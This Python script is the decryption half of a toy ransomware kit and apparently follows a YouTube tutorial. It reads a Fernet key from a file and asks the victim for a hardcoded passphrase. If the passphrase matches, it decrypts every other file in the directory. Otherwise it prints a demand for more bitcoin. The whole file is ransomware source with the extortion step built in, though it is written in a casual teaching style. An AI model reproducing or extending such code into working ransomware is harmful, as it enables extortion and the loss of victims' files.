#!/usr/bin/env python3

# https://www.youtube.com/watch?v=UtMMjXOlRQc

import os
from cryptography.fernet import Fernet


#let's find some files


files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

#Here, we are opening up the key file we created in voldemort.py and are storing the key
#inside the variable secretkey

with open("thekey.key", "rb") as key:
	secretkey = key.read()

#We can't just give them a key for free!! Here we are requiring a password to 
#unlock the ability to decrypt their files

secretphrase = "coffee"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

#Time to decrypt!!!!....but only if they have the correct secret phrase. 
#We check their secret phrase with an if statement and if they pass, we decrypt their files.

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("congrats, you're files are decrypted. Enjoy your coffee")
else:
	print("Sorry, wrong secret phrase. Send me more bitcoin")

